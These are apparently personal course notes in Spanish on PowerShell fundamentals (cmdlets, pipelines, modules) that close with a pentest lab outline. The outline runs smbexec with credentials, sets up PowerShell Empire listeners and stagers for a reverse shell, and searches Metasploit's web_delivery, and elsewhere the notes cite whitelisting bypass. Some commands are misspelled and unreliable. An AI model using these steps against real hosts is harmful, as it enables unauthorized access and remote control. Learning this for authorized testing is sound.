Powershell es un potente entorno de scripting y shell integrado. Disponibiblidad en todos los sitemas de Windows.
Puedes controlar casi todos los aspectos del sistema operativo Windows a través de PowerShell
Ventajas:
  -Llamar windows DLL functions from within Poweshell
  -Bypass aplication en lista blanca corriendo el de PowerShell CLI
  -Es facil de usar

The PowerShell CLI
CLI- PowerShell Command Line Interface
Nos proporciona acceso a comando, modulos, fanciones y formas de crear tareas, funciones y mas desde CLI
Menú de ayuda - powershell /?
Procesos - powershell -Command Get-Process

Comandos- Cmdlets
Los resultados de todas las salidas de comando generalmente se denominan objetos.
Se pueden procesas aún más utilizando lo que se conoce como "pipelinig".

Ejemplo:

PS C:\> Get-Process | Sort-Object -Unique | Select-Object ProcessName
 Retorna una lista de procesos (Get-Process), luego ordena la lista (Sort-Object) con (-Unique) parametro, 
  finalmente selecciona "ProcessName" objetos y retorna una unica lista de nombres de procesos (Select-Object ProcessName)
PS C:\> Get-Process firefox | Sort-Object -Unique | Format-List Path - Regresa ubicación
PS C:\> Get-WmiObject -class win32.operating systems | select -Property *

PowerShell Modules
Conjunto de funcionalidades de PowerShell, agrupados en forma de un único archivo que normalmente tendria .psm1 file extension
Los componentes de un modulo son:
Cualquier cantidad de scripts de PowerShell (.ps1) u otros archivos de código, como un ensamblado de smdlet administrado.
Ensamblados adicionales, archivos de ayuda o scripts.
Un archivo de manifiesto del módulo.
Un directorio que se utiliza para contener todo lo anterior.

  Diferentes tipos de Modulos
    -Script Modules
    -Binary Modules
    -Manifest Modules
    -Dinamic Modules
PS C:\> Get-Module - Ver modulos
Import-Module- importar

PowerShell Scripts
 La manera mas comun de utilizar PowerShell
  Se identifican con .ps1 extensión

PowerShell Objects
 Los objetos son esencialmente una representación de los datos que se proporcionan como resultado de un comando. 

Lab Demo: 
smbexec.py 'user:password!@#'@host
powershell-empire server
powershell-empire client
Establecer una sesion sobre el primer host y conseguir sesion con shell inversa
uselistener http
set Host - usar host especifico
set Port - usar puerto especifico
execute - ejecutar
listeners - oyentes que creamos
En el powershell-empire
usestager/multi/laucher
establecer conexion entre clientes - set listener http
agents- agentes
interact nomnbre del agente 
cat /etc/host- ver archivo hosts
analizar para encontrar puertos 
set Hosts host 
execute

msfconsole 
search web_delivery



PowerShell-Empire

Estudiar mas



